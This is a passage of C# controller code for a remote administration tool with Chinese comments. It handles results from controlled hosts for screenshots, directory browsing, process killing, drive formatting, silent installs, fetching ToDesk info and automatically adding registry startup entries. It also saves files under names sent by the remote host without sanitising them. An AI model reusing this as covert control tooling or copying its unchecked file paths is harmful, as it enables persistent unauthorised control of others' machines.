                AppendLog($"{tag}[截图] 收到OK但格式错误，缺少TaskID: {msg}");
                return;
            }
            string taskId = payload.Substring(sep + 1);

            // 找对应被控端的UniqueId
            string uniqueId = null;
            if (client != null)
            {
                HostInfo h = _hostList.Find(x => x.Client == client);
                if (h != null) uniqueId = h.UniqueId;
            }
            if (uniqueId == null)
            {
                AppendLog($"{tag}[截图] 无法找到对应被控端UniqueId");
                return;
            }

            string capturedUniqueId = uniqueId;
            string capturedTaskId = taskId;
            string capturedTag = tag;

            // ★ 起独立线程去9001接文件，不阻塞RecvLoop
            Thread t = new Thread(() =>
            {
                WaitAndRecvFileWithTaskId(capturedUniqueId, capturedTaskId, capturedTag);
            });
            t.IsBackground = true;
            t.Start();
        }

        // 结束进程结果
        private void HandleKillResult(byte[] data)
        {
            string msg = Encoding.UTF8.GetString(data);
            AppendLog("[结束进程] " + msg);
        }

        // 打开软件结果回报
        private void HandleOpenResult(byte[] data, string tag = "")
        {
            string msg = Encoding.UTF8.GetString(data);
            // 格式：OPEN_OK|说明|主机名  或  OPEN_FAIL|说明|主机名
            string[] parts = msg.Split('|');
            string type = parts.Length > 0 ? parts[0] : "";
            string desc = parts.Length > 1 ? parts[1] : msg;
            string cpu = parts.Length > 2 ? parts[2] : "";

            if (type == "OPEN_OK")
                AppendLog($"[{cpu}] [打开成功] {desc}");
            else if (type == "OPEN_FAIL")
                AppendLog($"[{cpu}] [打开失败] {desc}");
            else
                AppendLog($"{tag}[打开结果] {msg}");
        }

        // 下载进度回报
        // 截短文件名：前5字符 + ... + 扩展名，不足5字符全显示
        private string ShortenFilename(string filename)
        {
            string ext = Path.GetExtension(filename);       // 含点，如 ".zip"
            string nameNoExt = Path.GetFileNameWithoutExtension(filename);
            if (nameNoExt.Length <= 5) return filename;     // 不足5字符全显示
            return nameNoExt.Substring(0, 5) + "..." + ext;
        }

        // 格式化剩余时间
        private string FormatRemaining(long remainBytes, long speedBytesPerSec)
        {
            if (speedBytesPerSec <= 0) return "计算中";
            long totalSec = remainBytes / speedBytesPerSec;
            long d = totalSec / 86400;
            long h = (totalSec % 86400) / 3600;
            long m = (totalSec % 3600) / 60;
            long s = totalSec % 60;

            if (d > 0) return $"{d}天{h}小时{m}分{s}秒";
            if (h > 0) return $"{h}小时{m}分{s}秒";
            if (m > 0) return $"{m}分{s}秒";
            return $"{s}秒";
        }

        private void HandleDownloadProgress(byte[] data)
        {
            string msg = Encoding.UTF8.GetString(data);
            string[] parts = msg.Split('|');
            if (parts.Length < 2) { AppendLog("[下载] " + msg); return; }

            string type = parts[0];
            string filename = parts.Length > 1 ? parts[1] : "";
            string shortName = ShortenFilename(filename);

            if (type == "DONE" && parts.Length >= 5)
            {
                long downloaded = long.TryParse(parts[2], out long d2) ? d2 : 0;
                string savedPath = parts[3];
                string cpu = parts[4];
                AppendLog($"[{cpu}] [下载完成] {shortName}  " +
                          $"大小: {FormatSize(downloaded)}  " +
                          $"保存至: {savedPath}");
            }
            else if (type == "DONE_NORUN" && parts.Length >= 5)
            {
                long downloaded = long.TryParse(parts[2], out long d2) ? d2 : 0;
                string savedPath = parts[3];
                string cpu = parts[4];
                AppendLog($"[{cpu}] [下载完成] {shortName}  " +
                          $"大小: {FormatSize(downloaded)}  " +
                          $"保存至: {savedPath}（仅下载，未运行）");

                HostInfo target = _hostList.Find(h =>
                    !string.IsNullOrEmpty(h.HostName) &&
                    (h.HostName == cpu ||
                     cpu.StartsWith(h.HostName) ||
                     h.HostName.StartsWith(cpu)));

                // ★ 只有在_pendingStartupHosts里的host才触发启动项
                bool shouldAddStartup = false;
                if (target != null)
                {
                    lock (_pendingStartupHosts)
                    {
                        if (_pendingStartupHosts.Contains(target.UniqueId))
                        {
                            shouldAddStartup = true;
                            _pendingStartupHosts.Remove(target.UniqueId); // 用完移除，一次性触发
                        }
                    }
                }

                if (shouldAddStartup && target.Client != null && target.Client.Connected)
                {
                    AppendLog($"[{cpu}] [启动项] 下载完成，自动复制文件并写入注册表...");
                    SendCmdToHost(target, CMD_ADD_STARTUP_NOREG,
                        Encoding.UTF8.GetBytes(savedPath));
                }
            }
            else if (type == "PROG" && parts.Length >= 7)
            {
                long downloaded = long.TryParse(parts[2], out long d2) ? d2 : 0;
                long total = long.TryParse(parts[3], out long t) ? t : 0;
                long speed = long.TryParse(parts[4], out long sp) ? sp : 0;
                int percent = int.TryParse(parts[5], out int pc) ? pc : 0;
                string cpu = parts[6];
                string totalStr = total > 0 ? FormatSize(total) : "未知";
                long remaining = total > downloaded ? total - downloaded : 0;
                string remainStr = total > 0 ? FormatRemaining(remaining, speed) : "计算中";
                AppendLog($"[{cpu}] [下载] {shortName}  " +
                          $"{FormatSize(downloaded)} / {totalStr}  " +
                          $"速度: {FormatSize(speed)}/s  {percent}%  " +
                          $"剩余: {remainStr}");
            }

            else if (type == "INSTALL_START" && parts.Length >= 3)
            {
                string cpu = parts[2];
                AppendLog($"[{cpu}] [安装] {shortName} 开始静默安装，等待完成...");
            }
            else if (type == "INSTALL_DONE" && parts.Length >= 5)
            {
                string exitCode = parts[2];
                string rebootHint = parts[3];
                string cpu = parts[4];
                AppendLog($"[{cpu}] [安装完成] {shortName}  退出码: {exitCode}  {rebootHint}");
            }
            else if (type == "INSTALL_FAIL" && parts.Length >= 4)
            {
                string exitCode = parts[2];
                string cpu = parts[3];
                AppendLog($"[{cpu}] [安装失败] {shortName}  退出码: {exitCode}  " +
                          $"（可能是参数错误或程序本身问题）");
            }
            else if (type == "INSTALL_TIMEOUT" && parts.Length >= 3)
            {
                string cpu = parts[2];
                AppendLog($"[{cpu}] [安装超时] {shortName}  等待30分钟后仍未完成");
            }

            else if (type == "RUN_OK" && parts.Length >= 3)
            {
                string cpu = parts[2];
                AppendLog($"[{cpu}] [启动成功] {shortName} 已打开");
            }
            else if (type == "RUN_FAIL" && parts.Length >= 4)
            {
                string errCode = parts[2];
                string cpu = parts[3];
                AppendLog($"[{cpu}] [启动失败] {shortName}  错误码: {errCode}");
            }

            else if (type == "ASKLINK_RUN_OK" && parts.Length >= 3)
            {
                string cpu = parts[2];
                AppendLog($"[{cpu}] [连连控] 已成功启动");
            }
            else if (type == "ASKLINK_RUN_FAIL" && parts.Length >= 4)
            {
                string errCode = parts[2];
                string cpu = parts[3];
                AppendLog($"[{cpu}] [连连控] 启动失败，错误码: {errCode}");
            }
            else if (type == "ASKLINK_NOT_FOUND" && parts.Length >= 3)
            {
                string cpu = parts[2];
                AppendLog($"[{cpu}] [连连控] 未找到安装，请检查是否安装成功");
            }
            

            else
            {
                // ERROR或格式不符，直接显示原始内容
                AppendLog("[下载] " + msg);
            }
        }

        // ===== 传文件结果 =====
        private void HandleSendFileResult(byte[] data, string tag = "")
        {
            string msg = Encoding.UTF8.GetString(data);
            if (msg.StartsWith("ERROR:"))
                AppendLog($"{tag}[文件请求失败] {msg.Substring(6)}");
            else
                AppendLog($"{tag}[传文件] {msg}");
        }

        private string FormatSize(long bytes)
        {
            if (bytes >= 1024L * 1024 * 1024)
                return $"{bytes / 1024.0 / 1024 / 1024:F2} GB";
            else if (bytes >= 1024 * 1024)
                return $"{bytes / 1024.0 / 1024:F2} MB";
            else
                return $"{bytes / 1024} KB";
        }

        // 向指定被控端发送指令，在独立线程里执行不阻塞UI
        public void SendCmdToHost(HostInfo host, uint cmd, byte[] data)
        {
            if (host == null || host.Client == null || !host.Client.Connected)
            {
                // ★ 区分"重连中"和"真正离线"，给出不同提示
                if (host != null && host.IsReconnecting)
                    AppendLog($"[{host.HostName}] 正在重连中，指令暂时无法发送，请稍后重试");
                else
                    AppendLog($"[{host?.HostName ?? "未知"}] 当前离线，无法发送指令");
                return;
            }
            TcpClient capturedClient = host.Client;
            string capturedName = host.HostName;

            Thread t = new Thread(() =>
            {
                try
                {
                    SendPacket(capturedClient.GetStream(), cmd, data);
                }
                catch (Exception ex)
                {
                    AppendLog($"[{capturedName}] 发送失败: {ex.Message}");
                }
            });
            t.IsBackground = true;
            t.Start();
        }


        // 接收分块文件（在RecvLoop里调用，同步处理）
        private void HandleFileBegin(NetworkStream stream, byte[] beginData)
        {
            if (beginData.Length < 17) return;

            // 解析头部
            byte[] totalBuf = new byte[8];
            byte[] offsetBuf = new byte[8];
            Buffer.BlockCopy(beginData, 0, totalBuf, 0, 8);
            Buffer.BlockCopy(beginData, 8, offsetBuf, 0, 8);

            if (BitConverter.IsLittleEndian)
            {
                Array.Reverse(totalBuf);
                Array.Reverse(offsetBuf);
            }

            long totalSize = BitConverter.ToInt64(totalBuf, 0);
            long startOffset = BitConverter.ToInt64(offsetBuf, 0);
            string fnameUtf8 = Encoding.UTF8.GetString(beginData, 16, beginData.Length - 16);

            string savePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, fnameUtf8);
            string partPath = savePath + ".part";

            AppendLog($"[文件接收] 开始: {fnameUtf8}  总大小: {totalSize / 1024} KB  续传偏移: {startOffset}");

            FileStream fs = null;
            try
            {
                fs = new FileStream(partPath,
                    startOffset > 0 ? FileMode.Append : FileMode.Create,
                    FileAccess.Write);
            }
            catch (Exception ex)
            {
                AppendLog("[文件接收] 创建文件失败: " + ex.Message);
                return;
            }

            long received = startOffset;
            var sw = System.Diagnostics.Stopwatch.StartNew();
            long lastBytes = startOffset;
            long lastMs = 0;

            try
            {
                while (received < totalSize)
                {
                    uint chunkCmd;
                    byte[] chunkData;
                    if (!RecvPacket(stream, out chunkCmd, out chunkData)) break;

                    if (chunkCmd == CMD_FILE_END) break;
                    if (chunkCmd != CMD_FILE_CHUNK)
                    {
                        // 非文件块包，转交DispatchCommand（比如截图等）
                        DispatchCommand(chunkCmd, chunkData);
                        continue;
                    }

                    fs.Write(chunkData, 0, chunkData.Length);
                    received += chunkData.Length;

                    // 每1秒更新一次进度
                    long nowMs = sw.ElapsedMilliseconds;
                    if (nowMs - lastMs >= 1000)
                    {
                        long speed = (received - lastBytes) * 1000 / Math.Max(1, nowMs - lastMs);
                        long remaining = totalSize - received;
                        string speedStr = speed > 1024 * 1024
                            ? $"{speed / 1024 / 1024:F1} MB/s"
                            : $"{speed / 1024} KB/s";
                        string remainStr = FormatRemaining(remaining, speed);
                        AppendLog($"[文件接收] {fnameUtf8}  " +
                                  $"{FormatSize(received)} / {FormatSize(totalSize)}  " +
                                  $"速度: {speedStr}  剩余: {remainStr}");
                        lastMs = nowMs;
                        lastBytes = received;
                    }
                }
            }
            finally
            {
                fs.Close();
            }

            // 重命名临时文件
            if (File.Exists(savePath)) File.Delete(savePath);
            File.Move(partPath, savePath);

            string ext = Path.GetExtension(fnameUtf8).ToLower();
            AppendLog($"[文件接收完成] 保存路径: {savePath}  大小: {FormatSize(received)}");

            // 图片自动打开
            if (ext == ".jpg" || ext == ".bmp" || ext == ".png")
                System.Diagnostics.Process.Start(savePath);
        }


        // =========================
        // 指令分发
        // =========================
        private void DispatchCommand(uint cmd, byte[] data, TcpClient client = null)
        {
            // 找对应主机名，用于日志前缀
            string tag = "";
            if (client != null)
            {
                HostInfo h = _hostList.Find(x => x.Client == client);
                if (h != null) tag = $"[{h.HostName}] ";
            }

            switch (cmd)
            {
                case CMD_REGISTER:
                    HandleRegister(data);
                    break;
                case CMD_EXEC_RES:
                    HandleExecResult(data, tag);
                    break;
                case CMD_GETPROCS_RES:
                    HandleProcessList(data);
                    break;

                case CMD_DELETE_RES:
                    HandleDeleteResult(data, tag);
                    break;
                case CMD_GET_TODESK_INFO_RES:
                    HandleToDeskInfoResult(data, tag, client);
                    break;
                case CMD_SCREENSHOT_RES:
                    HandleScreenshotResult(data, tag, client);  // ★ 加上client参数
                    break;
                case CMD_SEND_FILE_RES:
                    HandleSendFileResult(data, tag);
                    break;
                case CMD_KILL_RES:
                    HandleKillResult(data);
                    break;
                case CMD_OPEN_RES:
                    HandleOpenResult(data, tag);
                    break;
                case CMD_DOWNLOAD_PROGRESS:
                    HandleDownloadProgress(data);
                    break;
                case CMD_LIST_DIR_RES:
                    HandleDirResult(data);
                    break;
                case CMD_LIST_DRIVES_RES:
                    HandleDrivesResult(data);
                    break;
                case CMD_DIR_FILE_COUNT:
                    HandleDirFileCount(data);
                    break;
                case CMD_FORMAT_RES:
                    HandleFormatResult(data, tag);
                    break;
                case CMD_DEL_DIR_RES:
                    HandleDelDirResult(data, tag);
                    break;
                case CMD_RUN_PROGRAM_RES:
                    HandleRunProgramResult(data, tag);
                    break;
                case CMD_KILL_PROCESS_RES:
                    HandleKillProcessResult(data, tag);
                    break;
                case CMD_GET_INSTALLED_RES:
                    HandleInstalledResult(data, tag);
                    break;
                case CMD_ADD_STARTUP_RES:
                case CMD_DEL_STARTUP_RES:
                    HandleStartupResult(data, tag);
                    break;
                case CMD_GET_STARTUP_LIST_RES:
                    HandleStartupListResult(data, tag);
                    break;
                case CMD_FILE_BEGIN:
                case CMD_FILE_CHUNK:
                case CMD_FILE_END:
                case CMD_HEARTBEAT:  // ★ 忽略心跳包
                    break;
                case CMD_REG_WRITE_AUTO_RES:
                    AppendLog($"{tag}[注册表] {Encoding.UTF8.GetString(data)}");
                    break;
                default:
                    AppendLog($"{tag}收到未知指令: {cmd}");
                    break;
            }
        }
        // =========================
        // 处理注册
        // =========================
        private void HandleRegister(byte[] data)
        {
            string msg = Encoding.UTF8.GetString(data);

            int sep = msg.IndexOf('|');
            string info = sep >= 0 ? msg.Substring(sep + 1) : msg;
            string[] fields = info.Split('|');

            var host = new HostInfo();
            host.OnlineStatus = "在线";
            host.Client = _controlledClient; // 记录当前连接

            var diskParts = new System.Text.StringBuilder();
            string nicType = "", nicName = "", lanIp = "", mac = "";

            foreach (string field in fields)
            {
                if (string.IsNullOrWhiteSpace(field)) continue;

                if (field.StartsWith("CPU:"))
                    host.CpuInfo = field.Substring(4).Trim();
                else if (field.StartsWith("MEM:"))
                    host.MemoryInfo = field.Substring(4).Trim();
                else if (field.StartsWith("HOST:"))
                    host.HostName = field.Substring(5).Trim();
                else if (field.StartsWith("WAN:"))
                    host.WanIp = field.Substring(4).Trim();
                else if (field.StartsWith("BOARD:"))
                    host.Products = field.Substring(6).Trim();
                else if (field.StartsWith("SSD[") || field.StartsWith("HDD[") ||
                         field.StartsWith("USB[") || field.StartsWith("CD[") ||
                         field.StartsWith("NET[") || field.StartsWith("DISK["))
                {
                    if (diskParts.Length > 0) diskParts.Append(" ");
                    diskParts.Append(field.Trim());
                }
                else if (field.StartsWith("ETH[") || field.StartsWith("WIFI["))
                {
                    if (string.IsNullOrEmpty(lanIp))
                    {
                        nicType = field.StartsWith("WIFI[") ? "WIFI" : "ETH";
                        string inner = field.Substring(field.IndexOf('[') + 1).TrimEnd(']');

                        int ipIdx = inner.IndexOf("IP:");
                        if (ipIdx >= 0)
                        {
                            int ipEnd = inner.IndexOf(' ', ipIdx + 3);
                            lanIp = ipEnd >= 0
                                ? inner.Substring(ipIdx + 3, ipEnd - ipIdx - 3)
                                : inner.Substring(ipIdx + 3);
                            lanIp = lanIp.Trim();
                        }

                        int macIdx = inner.IndexOf("MAC:");
                        if (macIdx >= 0)
                            mac = inner.Substring(macIdx + 4).Trim();

                        nicName = ipIdx >= 0
                            ? inner.Substring(0, ipIdx).Trim()
                            : inner;
                    }
                }
            }

            host.DiskInfo = diskParts.ToString();
            host.LanIp = lanIp;
            host.MacAddress = mac;
            host.UniqueId = mac; // ★ MAC地址作为唯一标识
            host.NetworkCardModel = string.IsNullOrEmpty(nicType) ? nicName : $"{nicType}:{nicName}";

            // ★ 用MAC查找是否已有同一台机器的记录（断线重连场景）
            Action updateUi = () =>
            {
                HostInfo existing = _hostList.Find(h => h.UniqueId == host.UniqueId);
                if (existing != null)
                {
                    // 断线重连：更新连接和动态信息，保留原有ID
                    existing.Client = host.Client;
                    existing.OnlineStatus = "在线";
                    existing.WanIp = host.WanIp;
                    existing.LanIp = host.LanIp;
                    existing.CpuInfo = host.CpuInfo;
                    existing.MemoryInfo = host.MemoryInfo;
                    existing.DiskInfo = host.DiskInfo;
                    existing.HostName = host.HostName;
                    existing.Products = host.Products;
                    objectListView.RefreshObject(existing);
                    AppendLog($"[{host.HostName}] 断线重连，信息已更新");
                }
                else
                {
                    // 新设备：分配新ID并加入列表
                    host.Id = ++_hostIdCounter;
                    _hostList.Add(host);
                    objectListView.SetObjects(_hostList);
                    AppendLog($"[{host.HostName}] 上线");
                }
            };

            if (objectListView.InvokeRequired)
                objectListView.Invoke(updateUi);
            else
                updateUi();
        }

        // =========================
        // 执行结果
        // =========================
        private void HandleExecResult(byte[] data, string tag = "")
        {
            string msg = Encoding.UTF8.GetString(data);
            int sep = msg.IndexOf('|');
            string output = sep >= 0 ? msg.Substring(sep + 1) : msg;
            AppendLog($"{tag}[执行结果]\r\n{output}");
        }

        // =========================
        // 进程列表
        // =========================
        private void HandleProcessList(byte[] data)
        {
            string msg = Encoding.UTF8.GetString(data);
            int sep = msg.IndexOf('|');
            string list = sep >= 0 ? msg.Substring(sep + 1) : msg;

            // 过滤系统进程、去掉PID、去重
            var seen = new System.Collections.Generic.HashSet<string>(StringComparer.OrdinalIgnoreCase);
            var sb = new System.Text.StringBuilder();
            foreach (string line in list.Split('\n'))
            {
                if (string.IsNullOrWhiteSpace(line)) continue;
                int comma = line.IndexOf(',');
                if (comma < 0) continue;
                string procName = line.Substring(comma + 1).Trim();
                if (_systemProcesses.Contains(procName)) continue;
                if (!seen.Add(procName)) continue;  // 已存在则跳过
                sb.AppendLine(procName);
            }

            ShowProcessList(sb.ToString());
        }

        // =========================
        // 显示进程
        // =========================
        private void ShowProcessList(string list)
        {
            if (richTextBoxPlus1.InvokeRequired)
            {
                richTextBoxPlus1.Invoke(new Action<string>(ShowProcessList), list);
                return;
            }
            AppendLog("进程列表已更新，追加如下：");
            AppendLog(list);
        }

        // ===== 解析目录列表 =====
        private void HandleListDir(byte[] data)
        {
            string msg = Encoding.UTF8.GetString(data);
            int sep = msg.IndexOf('\n');
            string dirPath = sep >= 0 ? msg.Substring(0, sep) : "";
            string list = sep >= 0 ? msg.Substring(sep + 1) : msg;

            var sb = new System.Text.StringBuilder();
            sb.AppendLine($"[目录] {dirPath}");
            sb.AppendLine(new string('-', 60));

            foreach (string line in list.Split('\n'))
            {
                if (string.IsNullOrWhiteSpace(line)) continue;
                string[] parts = line.Split('|');
                if (parts.Length < 4) continue;
                string type = parts[0];
                string name = parts[1];
                string size = parts[2];
                string time = parts[3];
                if (type == "D")
                    sb.AppendLine($"[目录]  {name,-40} {time}");
                else
                {
                    long sz = long.TryParse(size, out long s) ? s : 0;
                    string szStr = sz > 1024 * 1024
                        ? $"{sz / 1024 / 1024} MB"
                        : sz > 1024 ? $"{sz / 1024} KB" : $"{sz} B";
                    sb.AppendLine($"[文件]  {name,-40} {szStr,-12} {time}");
                }
            }

            string result = sb.ToString();

            if (richTextBoxPlus1.InvokeRequired)
                richTextBoxPlus1.Invoke(new Action(() =>
                {
                    richTextBoxPlus1.Clear();
                    richTextBoxPlus1.Text = result;
                }));
            else
            {
                richTextBoxPlus1.Clear();
                richTextBoxPlus1.Text = result;
            }

            AppendLog($"[目录列表] {dirPath}");
        }

        // 收到磁盘列表，填充 TreeListView 根节点
        private void HandleDrivesResult(byte[] data)
        {
            string msg = Encoding.UTF8.GetString(data);
            var roots = new System.Collections.Generic.List<FileNode>();

            foreach (string line in msg.Split('\n'))
            {
                if (string.IsNullOrWhiteSpace(line)) continue;
                string[] parts = line.Split('|');
                if (parts.Length < 3) continue;

                // parts[0]=盘符路径 parts[1]=类型 parts[2]=卷标
                string drivePath = parts[0];   // 如 "C:\"
                string driveType = parts[1];
                string label = parts[2];

                string displayName = string.IsNullOrEmpty(label)
                    ? $"{drivePath}  ({driveType})"
                    : $"{drivePath}  {label}  ({driveType})";

                roots.Add(new FileNode
                {
                    Name = displayName,
                    FullPath = drivePath,
                    IsDirectory = true,
                    Modified = "",
                    Size = 0
                });
            }

            Action fill = () =>
            {
                _dirCache.Clear();        // 切换主机时清空缓存
                _pendingPath = null;
                treeListView1.ClearObjects();
                treeListView1.SetObjects(roots);
                AppendLog($"[{_browsingHost?.HostName}] 共 {roots.Count} 个磁盘");
            };

            if (treeListView1.InvokeRequired)
                treeListView1.Invoke(fill);
            else
                fill();
        }

        // 收到目录内容，填充对应节点的子节点
        private void HandleDirResult(byte[] data)
        {
            string msg = Encoding.UTF8.GetString(data);
            int sep = msg.IndexOf('\n');
            string dirPath = sep >= 0 ? msg.Substring(0, sep) : "";
            string list = sep >= 0 ? msg.Substring(sep + 1) : msg;

            var children = new System.Collections.Generic.List<FileNode>();

            foreach (string line in list.Split('\n'))
            {
                if (string.IsNullOrWhiteSpace(line)) continue;
                if (line.StartsWith("ERROR:"))
                {
                    AppendLog($"[目录错误] {line.Substring(6)}");
                    continue;
                }
                string[] parts = line.Split('|');
                if (parts.Length < 4) continue;

                bool isDir = parts[0] == "D";
                long size = long.TryParse(parts[2], out long sz) ? sz : 0;
                string fullPath = dirPath.TrimEnd('\\') + "\\" + parts[1];

                children.Add(new FileNode
                {
                    Name = parts[1],
                    FullPath = fullPath,
                    IsDirectory = isDir,
                    Size = size,
                    Modified = parts[3]
                });
            }

            // 目录排前、文件排后，各自按名称排序
            children.Sort((a, b) => {
                if (a.IsDirectory != b.IsDirectory)
                    return a.IsDirectory ? -1 : 1;
                return string.Compare(a.Name, b.Name,
                    StringComparison.OrdinalIgnoreCase);
            });

            Action fill = () =>
            {
                // 存入缓存
                _dirCache[dirPath] = children;

                // 从根节点递归找到目标节点并刷新
                bool found = false;
                foreach (var obj in treeListView1.Objects)
                {
                    if (RefreshNodeRecursive(obj as FileNode, dirPath))
                    {
                        found = true;
                        break;
                    }
                }

                // 兜底：目标就是根节点本身（磁盘根目录）
                if (!found)
                {
                    foreach (var obj in treeListView1.Objects)
                    {
                        if (obj is FileNode fn && string.Equals(
                            fn.FullPath.TrimEnd('\\'), dirPath.TrimEnd('\\'),
                            StringComparison.OrdinalIgnoreCase))
                        {
                            treeListView1.RefreshObject(fn);
                            treeListView1.Expand(fn);
                            break;
                        }
                    }
                }

                _pendingPath = null;
                //控制端不返回treeview控件
                //AppendLog($"[{_browsingHost?.HostName}] {dirPath}  共 {children.Count} 项");
            };

            if (treeListView1.InvokeRequired)
                treeListView1.Invoke(fill);
            else
                fill();
        }

        // 递归找到路径匹配的节点并刷新
        private bool RefreshNodeRecursive(FileNode node, string targetPath)
        {
            if (node == null) return false;

            if (string.Equals(node.FullPath.TrimEnd('\\'),
                targetPath.TrimEnd('\\'), StringComparison.OrdinalIgnoreCase))
            {
                // 直接刷新该节点，TreeListView 会重新调用 ChildrenGetter
                // 此时缓存已存入，ChildrenGetter 命中缓存直接返回真实数据
                // 不折叠其他节点，只操作当前节点
                treeListView1.RefreshObject(node);
                treeListView1.Expand(node);
                return true;
            }

            if (_dirCache.TryGetValue(node.FullPath, out var children))
                foreach (var child in children)
                    if (RefreshNodeRecursive(child, targetPath))
                        return true;

            return false;
        }

        // ===== 删除结果 =====
        private void HandleDeleteResult(byte[] data, string tag = "")
        {
            string msg = Encoding.UTF8.GetString(data);
            AppendLog($"{tag}[删除结果] {msg}");
        }

        private void HandleFormatResult(byte[] data, string tag = "")
        {
            string msg = Encoding.UTF8.GetString(data);
            string[] parts = msg.Split('|');
            string type = parts.Length > 0 ? parts[0] : "";
            string desc = parts.Length > 1 ? parts[1] : msg;
            string cpu = parts.Length > 2 ? parts[2] : "";

            string prefix = string.IsNullOrEmpty(cpu) ? tag : $"[{cpu}] ";
            switch (type)
            {
                case "INFO": AppendLog($"{prefix}[格式化] {desc}"); break;
                case "OK": AppendLog($"{prefix}[格式化成功] {desc}"); break;
                case "WARN": AppendLog($"{prefix}[格式化跳过] {desc}"); break;
                case "DONE": AppendLog($"{prefix}[格式化完成] {desc}"); break;
                case "ERROR": AppendLog($"{prefix}[格式化错误] {desc}"); break;
                default: AppendLog($"{prefix}[格式化] {msg}"); break;
            }
        }

        private void HandleDelDirResult(byte[] data, string tag = "")
        {
            string msg = Encoding.UTF8.GetString(data);
            string[] parts = msg.Split('|');
            string type = parts.Length > 0 ? parts[0] : "";
            string desc = parts.Length > 1 ? parts[1] : msg;
            string cpu = parts.Length > 2 ? parts[2] : "";

            string prefix = string.IsNullOrEmpty(cpu) ? tag : $"[{cpu}] ";
            switch (type)
            {
                case "FOUND": AppendLog($"{prefix}[找到目录] {desc}"); break;
                case "OK": AppendLog($"{prefix}[删除成功] {desc}"); break;
                case "DONE": AppendLog($"{prefix}[删除完成] {desc}"); break;
                case "ERROR": AppendLog($"{prefix}[删除失败] {desc}"); break;
                default: AppendLog($"{prefix}[删除目录] {msg}"); break;
            }
        }

        private void HandleRunProgramResult(byte[] data, string tag = "")
        {
            string msg = Encoding.UTF8.GetString(data);
            string[] parts = msg.Split('|');
            string type = parts.Length > 0 ? parts[0] : "";
            string desc = parts.Length > 1 ? parts[1] : msg;
            string cpu = parts.Length > 2 ? parts[2] : "";
            string prefix = string.IsNullOrEmpty(cpu) ? tag : $"[{cpu}] ";
            if (type == "OK")
                AppendLog($"{prefix}[运行程序] {desc}");
            else
                AppendLog($"{prefix}[运行程序失败] {desc}");
        }

        private void HandleKillProcessResult(byte[] data, string tag = "")
        {
            string msg = Encoding.UTF8.GetString(data);
            foreach (string line in msg.Split('\n'))
            {
                if (string.IsNullOrWhiteSpace(line)) continue;
                string[] parts = line.Trim().Split('|');
                string type = parts.Length > 0 ? parts[0] : "";
                string desc = parts.Length > 1 ? parts[1] : line;
                string cpu = parts.Length > 2 ? parts[2] : "";
                string prefix = string.IsNullOrEmpty(cpu) ? tag : $"[{cpu}] ";
                if (type == "OK")
                    AppendLog($"{prefix}[结束进程] {desc}");
                else if (type == "FAIL")
                    AppendLog($"{prefix}[结束进程失败] {desc}");
                else
                    AppendLog($"{prefix}[结束进程] {desc}");
            }
        }

        private void HandleStartupListResult(byte[] data, string tag = "")
        {
            string content = Encoding.UTF8.GetString(data);

            string hostName = tag.Trim('[', ']', ' ');
            if (string.IsNullOrEmpty(hostName)) hostName = "unknown";

            string timeStr = DateTime.Now.ToString("yyyyMMdd_HHmmss");
            string fileName = $"开机启动项_{hostName}_{timeStr}.txt";
            string savePath = Path.Combine(
                AppDomain.CurrentDomain.BaseDirectory, fileName);

            try
            {
                File.WriteAllText(savePath, content, Encoding.UTF8);
                AppendLog($"{tag}[启动项列表] 已保存到: {savePath}");
            }
            catch (Exception ex)
            {
                AppendLog($"{tag}[启动项列表] 保存失败: {ex.Message}");
            }
        }

        private void HandleInstalledResult(byte[] data, string tag = "")
        {
            string content = Encoding.UTF8.GetString(data);

            // 找对应主机名生成文件名
            string hostName = tag.Trim('[', ']', ' ');
            if (string.IsNullOrEmpty(hostName)) hostName = "unknown";

            string timeStr = DateTime.Now.ToString("yyyyMMdd_HHmmss");
            string fileName = $"软件安装信息_{hostName}_{timeStr}.txt";
            string savePath = Path.Combine(
                AppDomain.CurrentDomain.BaseDirectory, fileName);

            try
            {
                File.WriteAllText(savePath, content, Encoding.UTF8);
                AppendLog($"{tag}[软件列表] 已保存到: {savePath}");
            }
            catch (Exception ex)
            {
                AppendLog($"{tag}[软件列表] 保存失败: {ex.Message}");
            }
        }

        private void HandleStartupResult(byte[] data, string tag = "")
        {
            string msg = Encoding.UTF8.GetString(data);
            foreach (string line in msg.Split('\n'))
            {
                if (string.IsNullOrWhiteSpace(line)) continue;
                string[] parts = line.Trim().Split('|');
                string type = parts.Length > 0 ? parts[0] : "";
                string desc = parts.Length > 1 ? parts[1] : line;
                string cpu = parts.Length > 2 ? parts[2] : "";
                string prefix = string.IsNullOrEmpty(cpu) ? tag : $"[{cpu}] ";
                if (type == "OK")
                    AppendLog($"{prefix}[启动项] {desc}");
                else if (type == "ERROR")
                    AppendLog($"{prefix}[启动项错误] {desc}");
                else
                    AppendLog($"{prefix}[启动项] {line}");
            }
        }

        // =========================
        // 按钮6 获取进程
        // =========================
        private void button6_Click(object sender, EventArgs e)
        {
            if (!CheckConnected()) return;

            SendPacket(_controlledClient.GetStream(),
                CMD_GETPROCS,
                new byte[0]);

            AppendLog("已发送获取进程列表指令");
        }

        // =========================
        // 检查连接
        // =========================
        private bool CheckConnected()
        {
            if (_controlledClient == null || !_controlledClient.Connected)
            {
                AppendLog("没有被控端连接");
                return false;
            }

            return true;
        }

        // =========================
        // 发送数据包
        // =========================
        private void SendPacket(NetworkStream stream, uint cmd, byte[] data)
        {
            lock (_sendLock)
            {
                byte[] magic = BitConverter.GetBytes(
                    IPAddress.HostToNetworkOrder(unchecked((int)MAGIC)));
                byte[] cmdBytes = BitConverter.GetBytes(
                    IPAddress.HostToNetworkOrder((int)cmd));
                byte[] lenBytes = BitConverter.GetBytes(
                    IPAddress.HostToNetworkOrder(data.Length));

                stream.Write(magic, 0, 4);
                stream.Write(cmdBytes, 0, 4);
                stream.Write(lenBytes, 0, 4);
                if (data.Length > 0)
                    stream.Write(data, 0, data.Length);
            }
        }

        // =========================
        // 接收数据包
        // =========================
        private bool RecvPacket(NetworkStream stream, out uint cmd, out byte[] data)
        {
            cmd = 0;
            data = new byte[0];

            try
            {
                byte[] hdr = RecvAll(stream, 12);
                if (hdr == null) return false;

                uint magic = (uint)IPAddress.NetworkToHostOrder(
                    BitConverter.ToInt32(hdr, 0));

                if (magic != MAGIC)
                    return false;

                cmd = (uint)IPAddress.NetworkToHostOrder(
                    BitConverter.ToInt32(hdr, 4));

                int dataLen = IPAddress.NetworkToHostOrder(
                    BitConverter.ToInt32(hdr, 8));

                data = dataLen > 0
                    ? RecvAll(stream, dataLen)
                    : new byte[0];

                return data != null;
            }
            catch
            {
                return false;
            }
        }

        // =========================
        // 接收固定长度
        // =========================
        private byte[] RecvAll(NetworkStream stream, int len)
